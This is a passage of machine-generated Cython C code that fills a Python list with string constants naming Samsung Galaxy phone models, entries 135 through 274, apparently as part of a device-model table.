  __Pyx_INCREF(__pyx_kp_s_GT_I9158V);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9158V);
  PyList_SET_ITEM(__pyx_t_3, 135, __pyx_kp_s_GT_I9158V);
  __Pyx_INCREF(__pyx_kp_s_GT_I9168I);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9168I);
  PyList_SET_ITEM(__pyx_t_3, 136, __pyx_kp_s_GT_I9168I);
  __Pyx_INCREF(__pyx_kp_s_GT_I9192I);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9192I);
  PyList_SET_ITEM(__pyx_t_3, 137, __pyx_kp_s_GT_I9192I);
  __Pyx_INCREF(__pyx_kp_s_GT_I9195H);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9195H);
  PyList_SET_ITEM(__pyx_t_3, 138, __pyx_kp_s_GT_I9195H);
  __Pyx_INCREF(__pyx_kp_s_GT_I9195L);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9195L);
  PyList_SET_ITEM(__pyx_t_3, 139, __pyx_kp_s_GT_I9195L);
  __Pyx_INCREF(__pyx_kp_s_GT_I9250);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9250);
  PyList_SET_ITEM(__pyx_t_3, 140, __pyx_kp_s_GT_I9250);
  __Pyx_INCREF(__pyx_kp_s_GT_I9303I);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9303I);
  PyList_SET_ITEM(__pyx_t_3, 141, __pyx_kp_s_GT_I9303I);
  __Pyx_INCREF(__pyx_kp_s_GT_I9305N);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9305N);
  PyList_SET_ITEM(__pyx_t_3, 142, __pyx_kp_s_GT_I9305N);
  __Pyx_INCREF(__pyx_kp_s_GT_I9308I);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9308I);
  PyList_SET_ITEM(__pyx_t_3, 143, __pyx_kp_s_GT_I9308I);
  __Pyx_INCREF(__pyx_kp_s_GT_I9505G);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9505G);
  PyList_SET_ITEM(__pyx_t_3, 144, __pyx_kp_s_GT_I9505G);
  __Pyx_INCREF(__pyx_kp_s_GT_I9505X);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9505X);
  PyList_SET_ITEM(__pyx_t_3, 145, __pyx_kp_s_GT_I9505X);
  __Pyx_INCREF(__pyx_kp_s_GT_I9507V);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9507V);
  PyList_SET_ITEM(__pyx_t_3, 146, __pyx_kp_s_GT_I9507V);
  __Pyx_INCREF(__pyx_kp_s_GT_I9600);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9600);
  PyList_SET_ITEM(__pyx_t_3, 147, __pyx_kp_s_GT_I9600);
  __Pyx_INCREF(__pyx_kp_s_GT_m190);
  __Pyx_GIVEREF(__pyx_kp_s_GT_m190);
  PyList_SET_ITEM(__pyx_t_3, 148, __pyx_kp_s_GT_m190);
  __Pyx_INCREF(__pyx_kp_s_GT_M5650);
  __Pyx_GIVEREF(__pyx_kp_s_GT_M5650);
  PyList_SET_ITEM(__pyx_t_3, 149, __pyx_kp_s_GT_M5650);
  __Pyx_INCREF(__pyx_kp_s_GT_mini);
  __Pyx_GIVEREF(__pyx_kp_s_GT_mini);
  PyList_SET_ITEM(__pyx_t_3, 150, __pyx_kp_s_GT_mini);
  __Pyx_INCREF(__pyx_kp_s_GT_N5000S);
  __Pyx_GIVEREF(__pyx_kp_s_GT_N5000S);
  PyList_SET_ITEM(__pyx_t_3, 151, __pyx_kp_s_GT_N5000S);
  __Pyx_INCREF(__pyx_kp_s_GT_N5100);
  __Pyx_GIVEREF(__pyx_kp_s_GT_N5100);
  PyList_SET_ITEM(__pyx_t_3, 152, __pyx_kp_s_GT_N5100);
  __Pyx_INCREF(__pyx_kp_s_GT_N5105);
  __Pyx_GIVEREF(__pyx_kp_s_GT_N5105);
  PyList_SET_ITEM(__pyx_t_3, 153, __pyx_kp_s_GT_N5105);
  __Pyx_INCREF(__pyx_kp_s_GT_N5110);
  __Pyx_GIVEREF(__pyx_kp_s_GT_N5110);
  PyList_SET_ITEM(__pyx_t_3, 154, __pyx_kp_s_GT_N5110);
  __Pyx_INCREF(__pyx_kp_s_GT_N5120);
  __Pyx_GIVEREF(__pyx_kp_s_GT_N5120);
  PyList_SET_ITEM(__pyx_t_3, 155, __pyx_kp_s_GT_N5120);
  __Pyx_INCREF(__pyx_kp_s_GT_N7000B);
  __Pyx_GIVEREF(__pyx_kp_s_GT_N7000B);
  PyList_SET_ITEM(__pyx_t_3, 156, __pyx_kp_s_GT_N7000B);
  __Pyx_INCREF(__pyx_kp_s_GT_N7005);
  __Pyx_GIVEREF(__pyx_kp_s_GT_N7005);
  PyList_SET_ITEM(__pyx_t_3, 157, __pyx_kp_s_GT_N7005);
  __Pyx_INCREF(__pyx_kp_s_GT_N7100T);
  __Pyx_GIVEREF(__pyx_kp_s_GT_N7100T);
  PyList_SET_ITEM(__pyx_t_3, 158, __pyx_kp_s_GT_N7100T);
  __Pyx_INCREF(__pyx_kp_s_GT_N7102);
  __Pyx_GIVEREF(__pyx_kp_s_GT_N7102);
  PyList_SET_ITEM(__pyx_t_3, 159, __pyx_kp_s_GT_N7102);
  __Pyx_INCREF(__pyx_kp_s_GT_N7105);
  __Pyx_GIVEREF(__pyx_kp_s_GT_N7105);
  PyList_SET_ITEM(__pyx_t_3, 160, __pyx_kp_s_GT_N7105);
  __Pyx_INCREF(__pyx_kp_s_GT_N7105T);
  __Pyx_GIVEREF(__pyx_kp_s_GT_N7105T);
  PyList_SET_ITEM(__pyx_t_3, 161, __pyx_kp_s_GT_N7105T);
  __Pyx_INCREF(__pyx_kp_s_GT_N7108);
  __Pyx_GIVEREF(__pyx_kp_s_GT_N7108);
  PyList_SET_ITEM(__pyx_t_3, 162, __pyx_kp_s_GT_N7108);
  __Pyx_INCREF(__pyx_kp_s_GT_N7108D);
  __Pyx_GIVEREF(__pyx_kp_s_GT_N7108D);
  PyList_SET_ITEM(__pyx_t_3, 163, __pyx_kp_s_GT_N7108D);
  __Pyx_INCREF(__pyx_kp_s_GT_N8000);
  __Pyx_GIVEREF(__pyx_kp_s_GT_N8000);
  PyList_SET_ITEM(__pyx_t_3, 164, __pyx_kp_s_GT_N8000);
  __Pyx_INCREF(__pyx_kp_s_GT_N8005);
  __Pyx_GIVEREF(__pyx_kp_s_GT_N8005);
  PyList_SET_ITEM(__pyx_t_3, 165, __pyx_kp_s_GT_N8005);
  __Pyx_INCREF(__pyx_kp_s_GT_N8010);
  __Pyx_GIVEREF(__pyx_kp_s_GT_N8010);
  PyList_SET_ITEM(__pyx_t_3, 166, __pyx_kp_s_GT_N8010);
  __Pyx_INCREF(__pyx_kp_s_GT_N8020);
  __Pyx_GIVEREF(__pyx_kp_s_GT_N8020);
  PyList_SET_ITEM(__pyx_t_3, 167, __pyx_kp_s_GT_N8020);
  __Pyx_INCREF(__pyx_kp_s_GT_N9000);
  __Pyx_GIVEREF(__pyx_kp_s_GT_N9000);
  PyList_SET_ITEM(__pyx_t_3, 168, __pyx_kp_s_GT_N9000);
  __Pyx_INCREF(__pyx_kp_s_GT_N9505);
  __Pyx_GIVEREF(__pyx_kp_s_GT_N9505);
  PyList_SET_ITEM(__pyx_t_3, 169, __pyx_kp_s_GT_N9505);
  __Pyx_INCREF(__pyx_kp_s_GT_P1000CWAXSA);
  __Pyx_GIVEREF(__pyx_kp_s_GT_P1000CWAXSA);
  PyList_SET_ITEM(__pyx_t_3, 170, __pyx_kp_s_GT_P1000CWAXSA);
  __Pyx_INCREF(__pyx_kp_s_GT_P1000M);
  __Pyx_GIVEREF(__pyx_kp_s_GT_P1000M);
  PyList_SET_ITEM(__pyx_t_3, 171, __pyx_kp_s_GT_P1000M);
  __Pyx_INCREF(__pyx_kp_s_GT_P1000T);
  __Pyx_GIVEREF(__pyx_kp_s_GT_P1000T);
  PyList_SET_ITEM(__pyx_t_3, 172, __pyx_kp_s_GT_P1000T);
  __Pyx_INCREF(__pyx_kp_s_GT_P1010);
  __Pyx_GIVEREF(__pyx_kp_s_GT_P1010);
  PyList_SET_ITEM(__pyx_t_3, 173, __pyx_kp_s_GT_P1010);
  __Pyx_INCREF(__pyx_kp_s_GT_P3100B);
  __Pyx_GIVEREF(__pyx_kp_s_GT_P3100B);
  PyList_SET_ITEM(__pyx_t_3, 174, __pyx_kp_s_GT_P3100B);
  __Pyx_INCREF(__pyx_kp_s_GT_P3105);
  __Pyx_GIVEREF(__pyx_kp_s_GT_P3105);
  PyList_SET_ITEM(__pyx_t_3, 175, __pyx_kp_s_GT_P3105);
  __Pyx_INCREF(__pyx_kp_s_GT_P3108);
  __Pyx_GIVEREF(__pyx_kp_s_GT_P3108);
  PyList_SET_ITEM(__pyx_t_3, 176, __pyx_kp_s_GT_P3108);
  __Pyx_INCREF(__pyx_kp_s_GT_P3110);
  __Pyx_GIVEREF(__pyx_kp_s_GT_P3110);
  PyList_SET_ITEM(__pyx_t_3, 177, __pyx_kp_s_GT_P3110);
  __Pyx_INCREF(__pyx_kp_s_GT_P5100);
  __Pyx_GIVEREF(__pyx_kp_s_GT_P5100);
  PyList_SET_ITEM(__pyx_t_3, 178, __pyx_kp_s_GT_P5100);
  __Pyx_INCREF(__pyx_kp_s_GT_P5200);
  __Pyx_GIVEREF(__pyx_kp_s_GT_P5200);
  PyList_SET_ITEM(__pyx_t_3, 179, __pyx_kp_s_GT_P5200);
  __Pyx_INCREF(__pyx_kp_s_GT_P5210XD1);
  __Pyx_GIVEREF(__pyx_kp_s_GT_P5210XD1);
  PyList_SET_ITEM(__pyx_t_3, 180, __pyx_kp_s_GT_P5210XD1);
  __Pyx_INCREF(__pyx_kp_s_GT_P5220);
  __Pyx_GIVEREF(__pyx_kp_s_GT_P5220);
  PyList_SET_ITEM(__pyx_t_3, 181, __pyx_kp_s_GT_P5220);
  __Pyx_INCREF(__pyx_kp_s_GT_P6200);
  __Pyx_GIVEREF(__pyx_kp_s_GT_P6200);
  PyList_SET_ITEM(__pyx_t_3, 182, __pyx_kp_s_GT_P6200);
  __Pyx_INCREF(__pyx_kp_s_GT_P6200L);
  __Pyx_GIVEREF(__pyx_kp_s_GT_P6200L);
  PyList_SET_ITEM(__pyx_t_3, 183, __pyx_kp_s_GT_P6200L);
  __Pyx_INCREF(__pyx_kp_s_GT_P6201);
  __Pyx_GIVEREF(__pyx_kp_s_GT_P6201);
  PyList_SET_ITEM(__pyx_t_3, 184, __pyx_kp_s_GT_P6201);
  __Pyx_INCREF(__pyx_kp_s_GT_P6210);
  __Pyx_GIVEREF(__pyx_kp_s_GT_P6210);
  PyList_SET_ITEM(__pyx_t_3, 185, __pyx_kp_s_GT_P6210);
  __Pyx_INCREF(__pyx_kp_s_GT_P6211);
  __Pyx_GIVEREF(__pyx_kp_s_GT_P6211);
  PyList_SET_ITEM(__pyx_t_3, 186, __pyx_kp_s_GT_P6211);
  __Pyx_INCREF(__pyx_kp_s_GT_P6800);
  __Pyx_GIVEREF(__pyx_kp_s_GT_P6800);
  PyList_SET_ITEM(__pyx_t_3, 187, __pyx_kp_s_GT_P6800);
  __Pyx_INCREF(__pyx_kp_s_GT_P7100);
  __Pyx_GIVEREF(__pyx_kp_s_GT_P7100);
  PyList_SET_ITEM(__pyx_t_3, 188, __pyx_kp_s_GT_P7100);
  __Pyx_INCREF(__pyx_kp_s_GT_P7300);
  __Pyx_GIVEREF(__pyx_kp_s_GT_P7300);
  PyList_SET_ITEM(__pyx_t_3, 189, __pyx_kp_s_GT_P7300);
  __Pyx_INCREF(__pyx_kp_s_GT_P7300B);
  __Pyx_GIVEREF(__pyx_kp_s_GT_P7300B);
  PyList_SET_ITEM(__pyx_t_3, 190, __pyx_kp_s_GT_P7300B);
  __Pyx_INCREF(__pyx_kp_s_GT_P7310);
  __Pyx_GIVEREF(__pyx_kp_s_GT_P7310);
  PyList_SET_ITEM(__pyx_t_3, 191, __pyx_kp_s_GT_P7310);
  __Pyx_INCREF(__pyx_kp_s_GT_P7320);
  __Pyx_GIVEREF(__pyx_kp_s_GT_P7320);
  PyList_SET_ITEM(__pyx_t_3, 192, __pyx_kp_s_GT_P7320);
  __Pyx_INCREF(__pyx_kp_s_GT_P7500D);
  __Pyx_GIVEREF(__pyx_kp_s_GT_P7500D);
  PyList_SET_ITEM(__pyx_t_3, 193, __pyx_kp_s_GT_P7500D);
  __Pyx_INCREF(__pyx_kp_s_GT_P7500M);
  __Pyx_GIVEREF(__pyx_kp_s_GT_P7500M);
  PyList_SET_ITEM(__pyx_t_3, 194, __pyx_kp_s_GT_P7500M);
  __Pyx_INCREF(__pyx_kp_s_GT_P7500R);
  __Pyx_GIVEREF(__pyx_kp_s_GT_P7500R);
  PyList_SET_ITEM(__pyx_t_3, 195, __pyx_kp_s_GT_P7500R);
  __Pyx_INCREF(__pyx_kp_s_GT_P7500V);
  __Pyx_GIVEREF(__pyx_kp_s_GT_P7500V);
  PyList_SET_ITEM(__pyx_t_3, 196, __pyx_kp_s_GT_P7500V);
  __Pyx_INCREF(__pyx_kp_s_GT_P7501);
  __Pyx_GIVEREF(__pyx_kp_s_GT_P7501);
  PyList_SET_ITEM(__pyx_t_3, 197, __pyx_kp_s_GT_P7501);
  __Pyx_INCREF(__pyx_kp_s_GT_P7511);
  __Pyx_GIVEREF(__pyx_kp_s_GT_P7511);
  PyList_SET_ITEM(__pyx_t_3, 198, __pyx_kp_s_GT_P7511);
  __Pyx_INCREF(__pyx_kp_s_GT_S3330);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S3330);
  PyList_SET_ITEM(__pyx_t_3, 199, __pyx_kp_s_GT_S3330);
  __Pyx_INCREF(__pyx_kp_s_GT_S3332);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S3332);
  PyList_SET_ITEM(__pyx_t_3, 200, __pyx_kp_s_GT_S3332);
  __Pyx_INCREF(__pyx_kp_s_GT_S3333);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S3333);
  PyList_SET_ITEM(__pyx_t_3, 201, __pyx_kp_s_GT_S3333);
  __Pyx_INCREF(__pyx_kp_s_GT_S3370);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S3370);
  PyList_SET_ITEM(__pyx_t_3, 202, __pyx_kp_s_GT_S3370);
  __Pyx_INCREF(__pyx_kp_s_GT_S3518);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S3518);
  PyList_SET_ITEM(__pyx_t_3, 203, __pyx_kp_s_GT_S3518);
  __Pyx_INCREF(__pyx_kp_s_GT_S3570);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S3570);
  PyList_SET_ITEM(__pyx_t_3, 204, __pyx_kp_s_GT_S3570);
  __Pyx_INCREF(__pyx_kp_s_GT_S3600i);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S3600i);
  PyList_SET_ITEM(__pyx_t_3, 205, __pyx_kp_s_GT_S3600i);
  __Pyx_INCREF(__pyx_kp_s_GT_S3650);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S3650);
  PyList_SET_ITEM(__pyx_t_3, 206, __pyx_kp_s_GT_S3650);
  __Pyx_INCREF(__pyx_kp_s_GT_S3653W);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S3653W);
  PyList_SET_ITEM(__pyx_t_3, 207, __pyx_kp_s_GT_S3653W);
  __Pyx_INCREF(__pyx_kp_s_GT_S3770K);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S3770K);
  PyList_SET_ITEM(__pyx_t_3, 208, __pyx_kp_s_GT_S3770K);
  __Pyx_INCREF(__pyx_kp_s_GT_S3770M);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S3770M);
  PyList_SET_ITEM(__pyx_t_3, 209, __pyx_kp_s_GT_S3770M);
  __Pyx_INCREF(__pyx_kp_s_GT_S3800W);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S3800W);
  PyList_SET_ITEM(__pyx_t_3, 210, __pyx_kp_s_GT_S3800W);
  __Pyx_INCREF(__pyx_kp_s_GT_S3802);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S3802);
  PyList_SET_ITEM(__pyx_t_3, 211, __pyx_kp_s_GT_S3802);
  __Pyx_INCREF(__pyx_kp_s_GT_S3850);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S3850);
  PyList_SET_ITEM(__pyx_t_3, 212, __pyx_kp_s_GT_S3850);
  __Pyx_INCREF(__pyx_kp_s_GT_S5220);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5220);
  PyList_SET_ITEM(__pyx_t_3, 213, __pyx_kp_s_GT_S5220);
  __Pyx_INCREF(__pyx_kp_s_GT_S5220R);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5220R);
  PyList_SET_ITEM(__pyx_t_3, 214, __pyx_kp_s_GT_S5220R);
  __Pyx_INCREF(__pyx_kp_s_GT_S5222);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5222);
  PyList_SET_ITEM(__pyx_t_3, 215, __pyx_kp_s_GT_S5222);
  __Pyx_INCREF(__pyx_kp_s_GT_S5230);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5230);
  PyList_SET_ITEM(__pyx_t_3, 216, __pyx_kp_s_GT_S5230);
  __Pyx_INCREF(__pyx_kp_s_GT_S5230W);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5230W);
  PyList_SET_ITEM(__pyx_t_3, 217, __pyx_kp_s_GT_S5230W);
  __Pyx_INCREF(__pyx_kp_s_GT_S5233T);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5233T);
  PyList_SET_ITEM(__pyx_t_3, 218, __pyx_kp_s_GT_S5233T);
  __Pyx_INCREF(__pyx_kp_s_GT_s5233w);
  __Pyx_GIVEREF(__pyx_kp_s_GT_s5233w);
  PyList_SET_ITEM(__pyx_t_3, 219, __pyx_kp_s_GT_s5233w);
  __Pyx_INCREF(__pyx_kp_s_GT_S5250);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5250);
  PyList_SET_ITEM(__pyx_t_3, 220, __pyx_kp_s_GT_S5250);
  __Pyx_INCREF(__pyx_kp_s_GT_S5253);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5253);
  PyList_SET_ITEM(__pyx_t_3, 221, __pyx_kp_s_GT_S5253);
  __Pyx_INCREF(__pyx_kp_s_GT_s5260);
  __Pyx_GIVEREF(__pyx_kp_s_GT_s5260);
  PyList_SET_ITEM(__pyx_t_3, 222, __pyx_kp_s_GT_s5260);
  __Pyx_INCREF(__pyx_kp_s_GT_S5280);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5280);
  PyList_SET_ITEM(__pyx_t_3, 223, __pyx_kp_s_GT_S5280);
  __Pyx_INCREF(__pyx_kp_s_GT_S5282);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5282);
  PyList_SET_ITEM(__pyx_t_3, 224, __pyx_kp_s_GT_S5282);
  __Pyx_INCREF(__pyx_kp_s_GT_S5283B);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5283B);
  PyList_SET_ITEM(__pyx_t_3, 225, __pyx_kp_s_GT_S5283B);
  __Pyx_INCREF(__pyx_kp_s_GT_S5292);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5292);
  PyList_SET_ITEM(__pyx_t_3, 226, __pyx_kp_s_GT_S5292);
  __Pyx_INCREF(__pyx_kp_s_GT_S5300);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5300);
  PyList_SET_ITEM(__pyx_t_3, 227, __pyx_kp_s_GT_S5300);
  __Pyx_INCREF(__pyx_kp_s_GT_S5300L);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5300L);
  PyList_SET_ITEM(__pyx_t_3, 228, __pyx_kp_s_GT_S5300L);
  __Pyx_INCREF(__pyx_kp_s_GT_S5301);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5301);
  PyList_SET_ITEM(__pyx_t_3, 229, __pyx_kp_s_GT_S5301);
  __Pyx_INCREF(__pyx_kp_s_GT_S5301B);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5301B);
  PyList_SET_ITEM(__pyx_t_3, 230, __pyx_kp_s_GT_S5301B);
  __Pyx_INCREF(__pyx_kp_s_GT_S5301L);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5301L);
  PyList_SET_ITEM(__pyx_t_3, 231, __pyx_kp_s_GT_S5301L);
  __Pyx_INCREF(__pyx_kp_s_GT_S5302);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5302);
  PyList_SET_ITEM(__pyx_t_3, 232, __pyx_kp_s_GT_S5302);
  __Pyx_INCREF(__pyx_kp_s_GT_S5302B);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5302B);
  PyList_SET_ITEM(__pyx_t_3, 233, __pyx_kp_s_GT_S5302B);
  __Pyx_INCREF(__pyx_kp_s_GT_S5303);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5303);
  PyList_SET_ITEM(__pyx_t_3, 234, __pyx_kp_s_GT_S5303);
  __Pyx_INCREF(__pyx_kp_s_GT_S5303B);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5303B);
  PyList_SET_ITEM(__pyx_t_3, 235, __pyx_kp_s_GT_S5303B);
  __Pyx_INCREF(__pyx_kp_s_GT_S5310);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5310);
  PyList_SET_ITEM(__pyx_t_3, 236, __pyx_kp_s_GT_S5310);
  __Pyx_INCREF(__pyx_kp_s_GT_S5310B);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5310B);
  PyList_SET_ITEM(__pyx_t_3, 237, __pyx_kp_s_GT_S5310B);
  __Pyx_INCREF(__pyx_kp_s_GT_S5310C);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5310C);
  PyList_SET_ITEM(__pyx_t_3, 238, __pyx_kp_s_GT_S5310C);
  __Pyx_INCREF(__pyx_kp_s_GT_S5310E);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5310E);
  PyList_SET_ITEM(__pyx_t_3, 239, __pyx_kp_s_GT_S5310E);
  __Pyx_INCREF(__pyx_kp_s_GT_S5310G);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5310G);
  PyList_SET_ITEM(__pyx_t_3, 240, __pyx_kp_s_GT_S5310G);
  __Pyx_INCREF(__pyx_kp_s_GT_S5310I);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5310I);
  PyList_SET_ITEM(__pyx_t_3, 241, __pyx_kp_s_GT_S5310I);
  __Pyx_INCREF(__pyx_kp_s_GT_S5310L);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5310L);
  PyList_SET_ITEM(__pyx_t_3, 242, __pyx_kp_s_GT_S5310L);
  __Pyx_INCREF(__pyx_kp_s_GT_S5310M);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5310M);
  PyList_SET_ITEM(__pyx_t_3, 243, __pyx_kp_s_GT_S5310M);
  __Pyx_INCREF(__pyx_kp_s_GT_S5310N);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5310N);
  PyList_SET_ITEM(__pyx_t_3, 244, __pyx_kp_s_GT_S5310N);
  __Pyx_INCREF(__pyx_kp_s_GT_S5312);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5312);
  PyList_SET_ITEM(__pyx_t_3, 245, __pyx_kp_s_GT_S5312);
  __Pyx_INCREF(__pyx_kp_s_GT_S5312B);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5312B);
  PyList_SET_ITEM(__pyx_t_3, 246, __pyx_kp_s_GT_S5312B);
  __Pyx_INCREF(__pyx_kp_s_GT_S5312C);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5312C);
  PyList_SET_ITEM(__pyx_t_3, 247, __pyx_kp_s_GT_S5312C);
  __Pyx_INCREF(__pyx_kp_s_GT_S5312L);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5312L);
  PyList_SET_ITEM(__pyx_t_3, 248, __pyx_kp_s_GT_S5312L);
  __Pyx_INCREF(__pyx_kp_s_GT_S5330);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5330);
  PyList_SET_ITEM(__pyx_t_3, 249, __pyx_kp_s_GT_S5330);
  __Pyx_INCREF(__pyx_kp_s_GT_S5360);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5360);
  PyList_SET_ITEM(__pyx_t_3, 250, __pyx_kp_s_GT_S5360);
  __Pyx_INCREF(__pyx_kp_s_GT_S5360B);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5360B);
  PyList_SET_ITEM(__pyx_t_3, 251, __pyx_kp_s_GT_S5360B);
  __Pyx_INCREF(__pyx_kp_s_GT_S5360L);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5360L);
  PyList_SET_ITEM(__pyx_t_3, 252, __pyx_kp_s_GT_S5360L);
  __Pyx_INCREF(__pyx_kp_s_GT_S5360T);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5360T);
  PyList_SET_ITEM(__pyx_t_3, 253, __pyx_kp_s_GT_S5360T);
  __Pyx_INCREF(__pyx_kp_s_GT_S5363);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5363);
  PyList_SET_ITEM(__pyx_t_3, 254, __pyx_kp_s_GT_S5363);
  __Pyx_INCREF(__pyx_kp_s_GT_S5367);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5367);
  PyList_SET_ITEM(__pyx_t_3, 255, __pyx_kp_s_GT_S5367);
  __Pyx_INCREF(__pyx_kp_s_GT_S5369);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5369);
  PyList_SET_ITEM(__pyx_t_3, 256, __pyx_kp_s_GT_S5369);
  __Pyx_INCREF(__pyx_kp_s_GT_S5380);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5380);
  PyList_SET_ITEM(__pyx_t_3, 257, __pyx_kp_s_GT_S5380);
  __Pyx_INCREF(__pyx_kp_s_GT_S5380D);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5380D);
  PyList_SET_ITEM(__pyx_t_3, 258, __pyx_kp_s_GT_S5380D);
  __Pyx_INCREF(__pyx_kp_s_GT_S5500);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5500);
  PyList_SET_ITEM(__pyx_t_3, 259, __pyx_kp_s_GT_S5500);
  __Pyx_INCREF(__pyx_kp_s_GT_S5560);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5560);
  PyList_SET_ITEM(__pyx_t_3, 260, __pyx_kp_s_GT_S5560);
  __Pyx_INCREF(__pyx_kp_s_GT_S5560i);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5560i);
  PyList_SET_ITEM(__pyx_t_3, 261, __pyx_kp_s_GT_S5560i);
  __Pyx_INCREF(__pyx_kp_s_GT_S5570B);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5570B);
  PyList_SET_ITEM(__pyx_t_3, 262, __pyx_kp_s_GT_S5570B);
  __Pyx_INCREF(__pyx_kp_s_GT_S5570I);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5570I);
  PyList_SET_ITEM(__pyx_t_3, 263, __pyx_kp_s_GT_S5570I);
  __Pyx_INCREF(__pyx_kp_s_GT_S5570L);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5570L);
  PyList_SET_ITEM(__pyx_t_3, 264, __pyx_kp_s_GT_S5570L);
  __Pyx_INCREF(__pyx_kp_s_GT_S5578);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5578);
  PyList_SET_ITEM(__pyx_t_3, 265, __pyx_kp_s_GT_S5578);
  __Pyx_INCREF(__pyx_kp_s_GT_S5600);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5600);
  PyList_SET_ITEM(__pyx_t_3, 266, __pyx_kp_s_GT_S5600);
  __Pyx_INCREF(__pyx_kp_s_GT_S5603);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5603);
  PyList_SET_ITEM(__pyx_t_3, 267, __pyx_kp_s_GT_S5603);
  __Pyx_INCREF(__pyx_kp_s_GT_S5610);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5610);
  PyList_SET_ITEM(__pyx_t_3, 268, __pyx_kp_s_GT_S5610);
  __Pyx_INCREF(__pyx_kp_s_GT_S5610K);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5610K);
  PyList_SET_ITEM(__pyx_t_3, 269, __pyx_kp_s_GT_S5610K);
  __Pyx_INCREF(__pyx_kp_s_GT_S5611);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5611);
  PyList_SET_ITEM(__pyx_t_3, 270, __pyx_kp_s_GT_S5611);
  __Pyx_INCREF(__pyx_kp_s_GT_S5620);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5620);
  PyList_SET_ITEM(__pyx_t_3, 271, __pyx_kp_s_GT_S5620);
  __Pyx_INCREF(__pyx_kp_s_GT_S5670);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5670);
  PyList_SET_ITEM(__pyx_t_3, 272, __pyx_kp_s_GT_S5670);
  __Pyx_INCREF(__pyx_kp_s_GT_S5670B);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5670B);
  PyList_SET_ITEM(__pyx_t_3, 273, __pyx_kp_s_GT_S5670B);
  __Pyx_INCREF(__pyx_kp_s_GT_S5670HKBZTA);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5670HKBZTA);
  PyList_SET_ITEM(__pyx_t_3, 274, __pyx_kp_s_GT_S5670HKBZTA);
  __Pyx_INCREF(__pyx_kp_s_GT_S5690);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S5690);
